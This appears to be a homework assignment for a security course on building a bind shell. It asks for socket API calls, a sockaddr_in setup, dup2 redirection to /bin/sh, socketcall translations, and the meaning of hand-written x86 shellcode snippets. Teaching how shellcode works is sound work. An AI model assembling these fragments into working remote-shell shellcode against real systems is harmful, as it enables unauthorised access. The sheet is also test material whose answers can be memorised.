-   You must submit your homework using this Latex template.

-   This homework is graded out of 80 points. Point values are
    associated to each question.

Questions
=========

1.  For each of the socket programming API calls below, provide (a) the
    arguments, (b) the return value, and (c) the function as called to
    set up a reverse shell.

    1.  (3 points) `socket()`

    2.  (3 points) `bind()`

    3.  (3 points) `listen()`

    4.  (3 points) `accept()`

2.  (3 points) On most Intel, x86 machines, what is the difference
    between network and host byte order?

3.  (5 points) Complete the code for the `struct sockaddr_in` such that
    the host will bind to address `192.168.2.1` on port 582.

        struct sockaddr_in host_addr;
        memset(&(host_addr), '\0', sizeof(struct sockaddr_in));
        host_addr.sin_family= /* ... */;
        host_addr.sin_port=/* ... */;
        host_addr.sin_addr.s_addr=/* ... */;

4.  (5 points) Explain how the following code snippet connects the newly
    connected client with the newly executed `/bin/sh`.

        dup2(client, 0);
        dup2(client, 1);
        dup2(client, 2); 

5.  (5 points) Modify the code snippet below such that multiple clients
    can connect to the remote shell such that a new shell is created for
    each connecting client.

        client = accept(server,
                        (struct sockaddr *) &client_addr,
                        &sin_size);

        dup2(client, 0);
        dup2(client, 1);
        dup2(client, 2);
        char *args[2]={"/bin//sh", NULL};
        execve(args[0], args, NULL);

6.  For each of the socket API calls, translate them to their
    `socketcall` equivalent. Yes, you may need to declare new variables
    to do this or infer variable type information, such as a `host_addr`
    and `client_addr` are of type `sockaddr_in`.

    1.  (3 points) `sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)`

    2.  (3 points)
        `bind(sockfd, &host_addr, sizeof(struct sockaddr_in))`

    3.  (3 points) `listen(sockfd,4)`

    4.  (3 points) `accept(sockfd, &client_addr, &sin_size)`

7.  (3 points) Why is it necessary to setup our own syscall method to
    perform socketcallâ€™s?

8.  Describe the socketcall arguments from the assembly code:

    1.  (5 points)

            xor ecx,ecx
            mov cl,0x2
            push ecx
            push esi ;sockfd
            mov ecx, esp
            xor ebx,ebx
            mov bl, 0x4
            xor eax,eax
            mov al,0x66
            int 0x80

    2.  (5 points)

            xor ecx,ecx
            push ecx
            push ecx
            push esi ;sockfd
            mov ecx,esp
            xor ebx,ebx
            mov bl, 0x5
            xor eax,eax
            mov al,0x66
            int 0x80
            mov edi,eax

    1.  (5 points)

            xor eax,eax
            push eax
            push 0x1
            push 0x2
            mov ecx,esp
            xor ebx,ebx
            mov bl,0x1
            mov al,0x66
            int 0x80
            mov esi,eax

    2.  (5 points)

            xor eax,eax
            push eax
            push WORD 0xbeef
            push WORD 0x02
            mov ecx,esp
            push 0x16
            push ecx
            push esi ;sockfd
            xor ebx,ebx
            mov bl,0x2
            mov ecx,esp
            mov al,0x66
            int 0x80

9.  (10 points) If register `edx` stores the value for the socket file
    descriptor (`sockfd`), and `ecx` stores the value of an open file
    descriptor. Write the `dup2()` code in assembly such that all the
    standard file descriptors are from the shell will be duplicated to
    the socket.
